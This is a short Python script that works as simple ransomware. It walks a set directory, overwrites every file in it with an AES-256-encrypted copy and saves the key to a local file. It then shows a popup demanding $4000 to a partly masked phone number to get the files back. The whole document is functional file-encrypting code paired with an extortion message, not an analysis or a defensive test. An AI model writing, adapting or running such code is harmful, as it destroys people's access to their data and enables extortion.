import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import tkinter as tk
from tkinter import messagebox

# Specify the directory and key file path
DIRECTORY = "/home/project/test"
KEY_FILE = "encryption_key.bin"

# Encrypt file function
def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        cipher = AES.new(key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        
        with open(file_path, 'wb') as f:
            f.write(cipher.nonce + tag + ciphertext)
        
        print(f"Encrypted {file_path}")
    except Exception as e:
        print(f"Failed to encrypt {file_path}: {e}")

# Encrypt all files in the specified directory
def encrypt_directory(directory, key):
    if not os.path.isdir(directory):
        print(f"Directory not found: {directory}")
        return
    
    print(f"Encrypting files in directory: {directory}")
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)
    print("Encryption complete.")

# Main function to generate key, save it, and encrypt directory
def main():
    key = get_random_bytes(32)  # Generate a random 32-byte key for AES-256
    with open(KEY_FILE, 'wb') as f:
        f.write(key)  # Save the key to a file
    print(f"Encryption key saved to {KEY_FILE}")
    
    encrypt_directory(DIRECTORY, key)
    
    # Show popup message after encryption is complete
    show_popup()

def show_popup():
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    messagebox.showinfo("Encryption Complete", "I got you! Your files have been encrypted. Pay $4000 to this number: 940765XXXX if you want your files back.")
    root.destroy()  # Destroy the Tkinter root window after the message box is closed

if __name__ == "__main__":
    main()

